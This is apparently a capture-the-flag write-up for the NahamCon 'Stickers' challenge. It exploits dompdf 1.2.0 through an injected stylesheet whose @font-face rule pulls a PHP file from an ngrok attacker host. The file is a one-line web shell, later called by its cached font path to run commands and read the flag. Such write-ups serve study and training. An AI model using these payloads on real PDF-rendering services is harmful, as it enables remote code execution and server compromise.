# Stickers

Date: 16/06/2023

Url: [http://challenge.nahamcon.com:31422/](http://challenge.nahamcon.com:31422/)

The webapp is like this:

![Untitled](Stickers%2095be2efdfd064eb7a818ef0bef7dba4f/Untitled.png)

Let’s use the webapp like a normal user to understand what it do:

![Untitled](Stickers%2095be2efdfd064eb7a818ef0bef7dba4f/Untitled%201.png)

After submitting it redirect me to a pdf file:

![Untitled](Stickers%2095be2efdfd064eb7a818ef0bef7dba4f/Untitled%202.png)

Let’s download it and let’s see all the metadata of the file using `exiftool`:

![Untitled](Stickers%2095be2efdfd064eb7a818ef0bef7dba4f/Untitled%203.png)

The producer is `dompdf 1.2.0` and I googled it to know if there is vulnerability of this software version and I found these resources:

- [Link1](https://exploit-notes.hdks.org/exploit/web/dompdf-rce/)
- [Link2](https://github.com/positive-security/dompdf-rce/)

The exploit consists of:

- Create a file `test.css`:
    
    ```powershell
    @font-face {
        font-family:'evil';
        src:url('http://f2ff-101-56-73-87.ngrok-free.app/exploit2.php');
        font-weight:'normal';
        font-style:'normal';
      }
    ```
    
- Create a file `exploit.php` (you can use any `ttf` file appending php code and changing the file type from ttf to php)
    
    ```powershell
    <?php system($_GET["cmd"]); ?>
    ```
    
- Add this text to one of the fields that will be added to the pdf:

```powershell
<link rel=stylesheet href='http://f2ff-101-56-73-87.ngrok-free.app/test.css'>
```

- Then understand where the file uploaded is stored: I found the correct path is:
    
    ```powershell
    /dompdf/lib/fonts/
    ```
    
- create the md5 of the filename of the php file:
    
    ![Untitled](Stickers%2095be2efdfd064eb7a818ef0bef7dba4f/Untitled%204.png)
    
- get the php file uploaded and it will be executed: `/font-family_font-style_md5.php`
    
    ```powershell
    /dompdf/lib/fonts/evil_normal_ee8715ae24101cbb608f466fde338501.php?cmd=cat</flag.txt
    ```
    

Then got the flag: `flag{a4d52beabcfdeb6ba79fc08709bb5508}`